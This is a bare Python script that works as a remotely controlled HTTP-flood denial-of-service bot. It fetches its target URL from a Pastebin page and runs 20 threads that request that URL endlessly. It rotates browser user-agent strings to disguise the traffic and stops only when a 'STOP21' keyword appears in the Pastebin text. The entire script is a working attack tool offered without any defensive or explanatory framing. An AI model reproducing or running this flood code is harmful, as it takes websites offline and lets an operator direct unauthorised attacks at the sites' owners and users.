user_agent_list = [
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
]
import requests, random
global url
while True:
    try:
        url = requests.get('https://pastebin.com/raw/SUWiWguE').text
        print(url)
        break
    except:
        pass

def do(fghfg):
    while True:
        try:
            if 'STOP21' not in url:
                header = {'User-Agent':str(random.choice(user_agent_list))}
                htmlContent = requests.get(url, headers=header)
                print(htmlContent)
        except:
            pass

import random
import threading
import time

threads=list()
for _ in range(20):
    td=threading.Thread(target=do, args=(2,))
    td.start()
    threads.append(td)
while True:
    try:
        a=requests.get('https://pastebin.com/raw/SUWiWguE').text
        if a not in url:
            url=a
            print(a+' '+url)
        time.sleep(30)
    except:
        pass
